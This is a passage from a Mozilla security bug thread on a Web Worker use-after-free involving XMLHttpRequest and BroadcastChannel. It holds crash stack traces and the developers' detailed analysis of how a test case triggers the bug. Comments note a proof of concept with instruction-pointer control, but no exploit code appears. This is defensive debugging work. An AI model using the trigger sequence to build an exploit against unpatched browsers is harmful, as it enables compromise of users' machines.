#25: mozilla::dom::BroadcastChannelChild::RecvNotify(mozilla::dom::ClonedMessageData const&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb8c6ba1]
#26: mozilla::dom::PBroadcastChannelChild::OnMessageReceived(IPC::Message const&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x291d860]
#27: mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x22bbf38]
#28: mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x1ab6370]
#29: mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x1aaf72f]
#30: mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x1ab22e7]
#31: mozilla::ipc::MessageChannel::MessageTask::Run()[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x1ab3898]
#32: nsThread::ProcessNextEvent(bool, bool*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x41e3a0]
#33: NS_ProcessPendingEvents(nsIThread*, unsigned int)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x4158a6]
#34: mozilla::dom::WorkerPrivate::ClearMainEventQueue(mozilla::dom::WorkerPrivate::WorkerRanOrNot)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb80a7d2]
#35: mozilla::dom::WorkerPrivate::DestroySyncLoop(unsigned int)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb811fa8]
#36: mozilla::dom::WorkerPrivate::RunCurrentSyncLoop()[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb8114d1]
#37: mozilla::dom::(anonymous namespace)::LoadAllScripts(mozilla::dom::WorkerPrivate*, nsTArray<mozilla::dom::(anonymous namespace)::ScriptLoadInfo>&, bool, mozilla::dom::WorkerScriptType, mozilla::ErrorResult&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb771aaa]
#38: mozilla::dom::workerinternals::LoadMainScript(mozilla::dom::WorkerPrivate*, nsTSubstring<char16_t> const&, mozilla::dom::WorkerScriptType, mozilla::ErrorResult&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb77093a]
#39: mozilla::dom::(anonymous namespace)::CompileScriptRunnable::WorkerRun(JSContext*, mozilla::dom::WorkerPrivate*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb859995]
#40: mozilla::dom::WorkerRunnable::Run()[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb833e05]
#41: nsThread::ProcessNextEvent(bool, bool*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x41e3a0]
#42: NS_ProcessNextEvent(nsIThread*, bool)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x42b324]
#43: mozilla::dom::WorkerPrivate::DoRunLoop(JSContext*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb7ff9d5]
#44: mozilla::dom::workerinternals::(anonymous namespace)::WorkerThreadPrimaryRunnable::Run()[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb79e846]
#45: nsThread::ProcessNextEvent(bool, bool*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x41e3a0]
#46: NS_ProcessNextEvent(nsIThread*, bool)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x42b324]
#47: mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x1ac489e]
#48: MessageLoop::RunInternal()[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x1972961]
#49: MessageLoop::Run()[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x197259e]
#50: nsThread::ThreadFunc(void*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x413d86]
#51: _pt_root[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/libnss3.dylib +0x423007]
#52: _pthread_body[/usr/lib/system/libsystem_pthread.dylib +0x32eb]
#53: _pthread_start[/usr/lib/system/libsystem_pthread.dylib +0x6249]

```
Status: NEW → ASSIGNEDPriority: -- → P2

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a1769724_20209)• 6 years ago |

Blocks: [1547059](/show_bug.cgi?id=1547059 "RESOLVED DUPLICATE - AddressSanitizer: heap-use-after-free [@ CCGraphBuilder::NoteXPCOMChild] with READ of size 8")

|  | [Looben Yang](/user_profile?user_id=506912)  Reporter |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1545345#c4)• 6 years ago |
|  | |

Is there anyone working on this bug? It's reported almost 2 months ago.

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1545345#c5)• 6 years ago |
|  | |

Thanks for checking. It is indeed being worked, but we're trying hard to avoid just pushing the signatures around. There are some systemic issues around worker shutdown that we're looking into.

That said, I don't think I'd fully processed [comment 2](/show_bug.cgi?id=1545345#c2 "RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest") indicating control over the instruction pointer. Can you clarify what build you reproduced that on? We may need to land a combination of changes that shunt this scenario to crashes or early failures.

Flags: needinfo?(loobenyang)

|  | [Looben Yang](/user_profile?user_id=506912)  Reporter |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1545345#c6)• 6 years ago |
|  | |

(In reply to Andrew Sutherland [:asuth] (he/him) from [comment #5](/show_bug.cgi?id=1545345#c5 "RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest"))

> Thanks for checking. It is indeed being worked, but we're trying hard to avoid just pushing the signatures around. There are some systemic issues around worker shutdown that we're looking into.
>
> That said, I don't think I'd fully processed [comment 2](/show_bug.cgi?id=1545345#c2 "RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest") indicating control over the instruction pointer. Can you clarify what build you reproduced that on? We may need to land a combination of changes that shunt this scenario to crashes or early failures.

That's run against an official 32 bit Firefox nightly build from Mozilla, a latest nightly build on that day.

Firefox version: 68.0a1 (2019-04-17) (32-bit)

Flags: needinfo?(loobenyang)

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1545345#c7)• 6 years ago |
|  | |

Any updates?

Flags: needinfo?(bugmail)

|  | [Hsin-Yi Tsai (she/her) [:hsinyi]](/user_profile?user_id=434964) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a5597328_434964)• 6 years ago |

Assignee: ytausky → bugmail

|  | [Looben Yang](/user_profile?user_id=506912)  Reporter |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1545345#c8)• 6 years ago |
|  | |

Is there any update? It's almost 3 months.

Usually security bugs were fixed in a couple weeks. If some developers were overloaded, can this be assigned to someone else?

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1545345#c9)• 6 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1545345&comment_id=14212904 "1 revision") |
|  | |

Tracking Requested - why for this release: sec-high.

It's too late for 68 at this point.

[status-firefox68](/buglist.cgi?f1=cf_status_firefox68&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox68&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox68&o1=equals&v1=wontfix)
[status-firefox69](/buglist.cgi?f1=cf_status_firefox69&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=affected)
[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected)
[tracking-firefox69](/buglist.cgi?f1=cf_tracking_firefox69&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox69&o1=equals&v1=%2B)
[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=%3F)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1545345#c10)• 6 years ago |
|  | |

We have a stack of patches in [bug 1559919](/show_bug.cgi?id=1559919 "RESOLVED FIXED - Finish the WorkerHolder cleanup") that we believe should improve worker invariants in general. We'll be trying to land these this week and mop up the rest of the related worker life-cycle invariants as well that aren't fixed. The particular concern for this bug is that IPC messages continued to be processed and run content-exposed code after they should (plus some extra complexities involving the sync loop).

Flags: needinfo?(bugmail)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1545345#c11)• 5 years ago |
|  | |

I'm going to assume that [bug 1559919](/show_bug.cgi?id=1559919 "RESOLVED FIXED - Finish the WorkerHolder cleanup") isn't something we can uplift, so where does that leave us for Fx69/ESR68 for this bug? Is there anything we can do at least make this a safe crash there or something?

Flags: needinfo?(bugmail)

|  | [Looben Yang](/user_profile?user_id=506912)  Reporter |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1545345#c12)• 5 years ago |
|  | |

This bug missed the 90 day deadline advocated by Google. It never happens before with Mozilla.

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1545345#c13)• 5 years ago |
|  | |

Massive apologies on the delays on this bug.

[Bug 1559919](/show_bug.cgi?id=1559919 "RESOLVED FIXED - Finish the WorkerHolder cleanup") did not address the invariant issues. So here's the current analysis and plans for imminent fixes:

## What the Test Case Is Doing

* Page:
  + Creates a worker.
  + Spams the worker using BroadcastChannel. The (emergent) intent of this is

    to trigger a synchronous XHR from inside

    DestroySyncLoop/ClearMainEventQueue, creating a nested clearing/syncloop

    destruction.
  + Triggers a page reload.
    - This results in an attempt to terminate the worker, although it's not

      clear that this is necessary for the reproduction.
    - This also just reloads the whole scenario, helping to increase the

      likelihood of a nested syncloop occurring thanks to broadcast channel.
* Worker:
  + Creates a BroadcastChannel listener whose (async) message handler initiates

    a synchronous XHR and then aborts it once it completes.
    - Both methods are WorkerThreadProxySyncRunnables which means they both

      create syncloops which means this widens the potenial for a nested

      syncloop to be created by the BroadcastChannel message.
    - These both end up needing to bounce to the main thread because that's

      where the canonical state lives. (Even if the XHR object should

      notionally not need to consult the main thread, it does unless the worker

      has reached cancellation state.)
  + Creates a file reader that configures the XHR for synchronous operation when

    the load completes (or aborts, as is the case in this situation.)
  + Creates the XHR (before close).
  + Calls self.close() which, because this is a top-level script load which

    means we're in a sync loop, causes a deferred invocation of

    ClearMainEventQueue and defers dispatching the cancel runnable. From a

    spec perspective, it should be impossible to ever dispatch another task to

    the worker after this point.
    - We previously had a safer behavior where we would fail to do a lot of

      things after this point that would be observable by other globals despite

      this global's inability to receive and process further tasks. We

      corrected this, allowing BroadcastChannel messages to be set, etc., and

      somewhat weakening our guards against dubious things happening after

      close() is called.
  + Calls FileReader.readAsArrayBuffer:
    - This is probably fine. This code intends to be a no-op when the worker is

      shutting down (and indeed, with close called, per spec, the load can never

      complete), but because the weak worker ref is tied to canceling, the

      closing state has no effect. But this is likely fine because the state

      per spec should advance to loading, and that is observable per the spec

      for abort() which will generate synchronous event dispatches.
    - This puts us in mReadyState of LOADING and triggers an async wait.
  + Calls FileReader.abort:
    - Because of the above call to readAsArrayBuffer, this does not fast-bail.

      We trigger a synchronous dispatch of the "loadend" event which triggers

      the logic to configure the XHR to be synchronous. It's not clear that

      the FileReader is entirely necessary to the reproduction, but this

      behavior does seem necessary per spec. (And is harmless unless I'm

      missing a nuance.)
  + The script reaches the end of its evaluation, which will cause the syncloop

    to attempt to unwind. Which means it will attempt to call

    ClearMainEventQueue. Unfortunately, BroadcastChannel operates on an IPC

    threading model and so doesn't get its event canceled. Instead its event

    gets processed and the logic in BroadcastChannelChild::RecvNotify's that

    calls only DOMEventTargetHelper::CheckCurrentGlobalCorrectness() to check

    the state of the worker ends up confused and dispatches an event that

    should never have been dispatched. (Although [bug 1455020](/show_bug.cgi?id=1455020 "RESOLVED FIXED - Extend CheckInnerWindowCorrectness() to check the state of the worker.") was notionally

    concerned about this when it renamed the method, it only added an

    mParentObject check. This check is really a check of whether

    WorkerGlobalScope::NoteTerminating() has been invoked which then calls

    DisconnectEventTargetObjects(). But NoteTerminating is only called when

    WorkerPrivate::NotifyInternal is invoked with a status >= Canceling, which

    Close is not. (And as noted above, the cancelling state is deferred. It

    only runs when DestroySyncLoop has returned from ClearMainEventQueue()!)).

## What Invariants Are Going Wrong

* BroadcastChannel is dispatching events when it should not be. This is the

  primary invariant violation here, as it's allowing content to be invoked on

  the stack when it's absolutely not expected to be invoked on the stack. It's

  depending on one of the following things to protect it:
  + Being wrapped into a WorkerRunnable so it gets canceled instead of run.

    (It's not because it's IPC and it's not using the hybrid event target.)
    - The control flow for canceling WorkerRunnables is extra insane, as it

      depends on WorkerRunnable::Run() noticing that

      WorkerPrivate::AllPendingRunnablesShouldBeCanceled() returns true. Normal

      runnables just run.
    - Unfortunately event hybrid event target wrapping is semantically

      problematic because it coerces the normal runnables into control

      runnables.
  + Having DOMEventTargetHelper protect it from dispatching the event. (It's

    not because DOMEventTargetHelper's guard is only effective once the worker

    has reached the Canceling state, which it has not because the event is

    being invoked inside the syncloop destruction which will only advance to

    the canceling state after the event loop is drained.)
    - It is reasonable to enforce that ClearMainEventQueue should preclude

      event dispatch to occur while clearing the queue. We should either fail

      to dispatch or crash. It's arguably reasonable to enforce this at both

      the DETH level as well as the global level.
    - From a semantics level, it makes sense to explicitly have checks for

      whether it's currently legal to call into content and whether it's legal

      to enqueue tasks. Unfortunately, both self.close() and syncloops throw

      wrenches into clear state transitions here. close() definitely precludes

      future task enqueueing. And syncloop unwinding definitely creates

      intervals where calls into content are indicative of fatal invariant

      violations (specifically, when clearing the event queue).
* DestroySyncLoop isn't preventing reentrancy into the mSyncLoopStack.IsEmpty()

  actions, although, again, it's the calls into content that are forcing the

  issue.
  + The double-dispatch of the CancelingRunnables is notionally idempotent and

    okay in terms of reference counting, it's really just the event loop

    clearing that causes issues.
* XMLHttpRequestWorker.cpp's EventRunnable::WorkerRun takes a copy of

  mProxy's raw, non-owning pointer and passes it onwards to

  ProgressEvent::Constructor or NS\_NewDOMEvent, both of whom derive an owning

  RefPtr or nsCOMPtr. This enables a use-after-free on XMLHttpRequestWorker in

  the event of apparent event reordering. This is a thing that's possible when

  you have re-entrancy of syncloop destruction/content invocation on top of a

  syncloop, as this cancels all runnables after the current runnable when our

  invariants expect this to be impossible, allowing naive assumptions of

  strong-refs being held by things that can only be deleted chronologically in a

  future turn of the event loop being violated.
  + NB: I need to explain this better. To restate somewhat more explicitly:

    sync calls from workers assume that no content re-entrancy can occur. The

    whole point of the nested event queues and syncloops is that no content

    re-entrancy ever occurs. This limits the ability to create mismatched

    ownership situations because any GC or strong references on the stack before

    the code went synchronous continue to exist.

## So The (Non)Action Items

* The IPC/runnable issue is important but hard to address because of the

  divergence between what the Cache API expects in terms of semantics (IPC is

  chrome privileged) and what implementations like BroadcastChannel expect

  (IPC is content privileged, roughly speaking).
* Preventing calls into content JS when no longer appropriate is therefore

  paramount. This can be addressed from multiple sides:
  + ClearEventQueue can 100% inhibit calls into JS by DETH or any code until

    explicitly cleared.
  + DOMEventTargetHelper can be made to understand when it is being used in a

    context that is explicitly synchronously reentrant from content, versus when

    it is being used in an explicitly asynchronous fashion. This is a unique

    distinction for workers, but a necessary and fundamental distinction in the

    face of `self.close()`. APIs such as BroadcastChannel and MessageChannel

    have explicitly async dispatches (at least for our IPC handlers; there

    may be some edge-cases for MessageChannels for freshly created channels that

    haven't had their ports shipped/entangled/etc.). In these cases, any

    attempt shoudl 100% fail after self.close() is called. The only wackiness

    we allow with sync XHR/etc. is that the stack be unwound. No further

    tasks should ever get to run.
* The syncloop reentrancy/mPostSyncLoopOperations-double-invocation needs harder

  guards that ensure we aren't allowed to start a new syncloop while popping the

  current one. A lesser option would be to reorder the stack consultation so

  that we noticed we're at 1 to sensitize for the call but don't actually pop

  down to 0 until the return, which would result in the nested seeing a 2->1

  transition instead of an additional, duplicative 1->0 transition, but it's

  really not okay to be pushing an additional syncloop. (Syncloops should only

  be allowed to be entered when in content, but it's not okay to be in content

  at that time.)

I'll attempt to get a candidate set of fixes with appropriate reproduction confirmations of this tomorrow. (That is, the reproduction should properly trigger failsafe assertions in the initial draft of the patch, and then the reproduction should only generate errors in the second draft of the patch wherein the invariants are properly guarded against without triggering the backstop crashing assertions.) This may spill into Friday as I try and better validate that I understand how the actual use-after-free is occurring.

Flags: needinfo?(bugmail)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a9682275_151407)• 5 years ago |

Priority: P2 → P1

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1545345#c14)• 5 years ago |
|  | |

re-rating sec-critical based on [comment 2](/show_bug.cgi?id=1545345#c2 "RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest")'s PoC (EIP control, not just ASAN detection)

Keywords: [sec-high](/buglist.cgi?keywords=sec-high&resolution=---) → [sec-critical](/buglist.cgi?keywords=sec-critical&resolution=---)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a10066826_1689)• 5 years ago |

Flags: sec-bounty? → sec-bounty+

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1545345#c16)• 5 years ago |
|  | |

I'm experiencing difficulty right now reproducing on nightly under linux64 opt, debug, or opt asan under both reproduction test cases including with a release assert on calling into JS content when ClearMainEventQueue and running asan and opt under rr (primarily attempting to offset my fast multi-core machine by serializing execution). And this includes running multiples tabs concurrently.

We did correct our worker thread priority from being below-normal to normal though (which I think is a significant priority difference on windows), so it's likely we've made it harder to reproduce the exact situation in question.

Tomorrow I'll endeavor to create a variation that just spams BroadcastChannel messages to trigger content re-entrancy in syncloop unwinding after self.close() is involved. That should be sufficient to validate the hard backstop content re-entrancy guards and the broadcast channel DOMEventTargetHelper guards. Once that's working (and those guards disabled again) it should be simple enough to expose an oracle to content to let it know when to trigger a nested syncloop and to verify we avoid attempting to perform the last-syncloop actions twice.

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1545345#c17)• 5 years ago |
|  | |

I'll also pursue local windows builds since that's the platform of greatest concern. Also if anyone has any recent reproduction backtraces on hand, please do paste/attach them to the bug as it would be useful to help account for code drift. (But no need to go out of your way. It's clear the content re-entrancy issues continues to exist even if it's somewhat harder to reproduce them.)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1545345#c18)• 5 years ago |
|  | |

Status update:

* Reproducing BroadcastChannel re-entrancy is in fact very easy. I created a mochitest for reproduction assistance.
* Reproducing the GC problem that led to the crash has been harder against trunk, so I'm planning to reproduce on the original revision and then potentially bisect a bit.
  + In my [comment 13](/show_bug.cgi?id=1545345#c13 "RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest") analysis I was overly focused on the re-entrancy invariants and that Yaron's ASAN repro provided evidence of this, but I'm still trying to reconstruct how we could end up with both an XMLHttpRequestWorker in the snow-white list that gets MaybeKillObject()ed (meaning it has a 0 refcount at the time of deletion) as well as have the dom::Event whose underlying WidgetEvent has an nsCOMPtr reference to the same XMLHttpRequestWorker itself be in the snow-white list. By rolling back to the code at the time of a known repro, I hope to reproduce under rr/pernosco and then leverage that to create a more targeted reproducing test and verify how that applies to trunk through the impending release.

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1545345#c19)• 5 years ago |
|  | |

We can't realistically get a safe fix for this for Fx69 ahead of next week's RC, so updating the flags accordingly.

[status-firefox69](/buglist.cgi?f1=cf_status_firefox69&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=wontfix)
[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=affected)
[tracking-firefox70](/buglist.cgi?f1=cf_tracking_firefox70&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=%2B)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1545345#c20)• 5 years ago |
|  | |

I've reproduced on the old build under ASAN, but naive efforts at reproducing under rr chaos and non-chaos didn't immediately work, so I'll be iterating a little bit.

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1545345#c21)• 5 years ago |
|  | |

Got a variant on the test to reproduce on the old code under rr and am currently analyzing in pernosco via pernosco-submit.

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1545345#c22)• 5 years ago |
|  | |

Okay, wow.

[https://pernos.co/debug/Op7WisIFoj25NC1245b9Cw/index.html#f{m[BNhV,fvs\_,t[sA,UXg\_,f{e[BNhV,fvI\_,s{af4mB4IAA,bAdQ,oDXIuoQ,uDWRuTA](https://pernos.co/debug/Op7WisIFoj25NC1245b9Cw/index.html#f%7Bm%5BBNhV,fvs_,t%5BsA,UXg_,f%7Be%5BBNhV,fvI_,s%7Baf4mB4IAA,bAdQ,oDXIuoQ,uDWRuTA)\_\_\_

nsIGlobalObject::DisconnectEventTargetObjects in WorkerGlobalScope::NoteTerminating in WorkerPrivate::ProcessAllControlRunnablesLocked in WorkerPrivate::InterruptCallback in JSContext::handleInterrupt in JS callstack in BC::Msg DispatchEvent in DestroySyncLoop/ClearMainEventQueue in XHRW::Send/SendInternal in BC::Msg in Destroy/Clear in XHRW::Send/SendI in BC::Msg ETC ETC

The key things here are:

* We have a sync event dispatch on the stack into JS space. The dispatch to the target does not have a kung fu death grip and assumes that mProxy continues to hold a strong ref to the XHRW.
* WE ARE PROCESSING CONTROL RUNNABLES IN THE MIDDLE OF ARBITRARY JS CONTENT IN THE INTERRUPT CALLBACK.
* WE ARE DISCONNECTING THE EVENT TARGETS IN THE MIDDLE OF SYNCHRONOUS EVENT DISPATCH.

Some of these things are concerning. I leave it as an exercise to the reader to infer which ones most terrifyingly are violating invariants...

Note that the intents here I think are reasonable. We do want to ensure that an infinite looping worker can be terminated by its parent/owner. That's absolutely reasonable. However, much like the syncloop semantics that defer the actual ramifications of self.close() until the stack is successfully unwound, we should not be actually undertaking the teardown of the global in this manner while we have potentially multiple syncloops on the stack as well as event dispatch. (However, it's fine to ensure that all JS content frames for the global immediately error all the way up the stack... the idea is just that much like the cycle collector hygienically defers the actual deletion of objects, it's wiser for us to defer DETH-disconnect and strong reference dropping until there's no longer any content and naive C++ frames on the stack. Although we should ensure kung fu grips are held in places where they aren't currently held but should be held...)

The particular test I used to reproduce this problem has also resulted in the given scenario happening inside asymmetrically paired Pin/Unpin calls, so that may also be involved or the dominant issue. I'll look into that tomorrow as well.

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1545345#c23)• 5 years ago |
|  | |

Andrew - are you still working on this issue? Anyone else you could pull into it for help?

[status-firefox71](/buglist.cgi?f1=cf_status_firefox71&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=affected)
[tracking-firefox71](/buglist.cgi?f1=cf_tracking_firefox71&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox71&o1=equals&v1=%2B)Flags: needinfo?(bugmail)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1545345#c24)• 5 years ago |
|  | |

Still working, yes. Expect an update soon.

Flags: needinfo?(bugmail)

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1545345#c25)• 5 years ago |
|  | |

I'll keep tracking this for 70 to keep it on the radar for potential dot release.

|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1545345#c26)• 5 years ago |
|  | |

(In reply to Andrew Sutherland [:asuth] (he/him) from [comment #24](/show_bug.cgi?id=1545345#c24 "RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest"))

> Still working, yes. Expect an update soon.

Hi Andrew, do you have an update on this bug? Thanks

Flags: needinfo?(bugmail)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a16124908_1689)• 5 years ago |

See Also: → [CVE-2019-17008](/show_bug.cgi?id=1546331 "RESOLVED FIXED - Web Workers - Use After Free in RegisterDebuggerMainThread()")

|  | [Eden Chuang[:edenchuang]](/user_profile?user_id=516138) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a16361308_516138)• 5 years ago |

See Also: → [1557732](/show_bug.cgi?id=1557732 "VERIFIED FIXED - Assertion failure: js::GetNonCCWObjectRealm(wrapper) == js::GetContextRealm(cx), at /builds/worker/workspace/build/src/dom/workers/WorkerRunnable.cpp:345")

|  | [Eden Chuang[:edenchuang]](/user_profile?user_id=516138) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a16884831_516138)• 5 years ago |

See Also: [CVE-2019-17008](/show_bug.cgi?id=1546331 "RESOLVED FIXED - Web Workers - Use After Free in RegisterDebuggerMainThread()") →

|  | [Andrew Overholt [:overholt]](/user_profile?user_id=442218) |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1545345#c27)• 5 years ago |
|  | |

(For those playing along at home, Andrew Sutherland told me he's trying to figure out why this isn't reproducible on more recent builds (or how the testcase needs to be changed to do so)).

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1545345#c28)• 5 years ago |
|  | |

Too late for a fix in 70 at this point.

[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=wontfix)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1545345#c29)• 5 years ago |
|  | |

Finishing up attempting creating reproduction test case.

Flags: needinfo?(bugmail)

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=1545345#c30)• 5 years ago |
|  | |

We could still potentially get a patch into 72 beta, tracking for 72.

[status-firefox72](/buglist.cgi?f1=cf_status_firefox72&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=affected)
[status-firefox73](/buglist.cgi?f1=cf_status_firefox73&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=affected)
[tracking-firefox72](/buglist.cgi?f1=cf_tracking_firefox72&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox72&o1=equals&v1=%2B)
[tracking-firefox73](/buglist.cgi?f1=cf_tracking_firefox73&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox73&o1=equals&v1=%2B)

|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=1545345#c31)• 5 years ago |
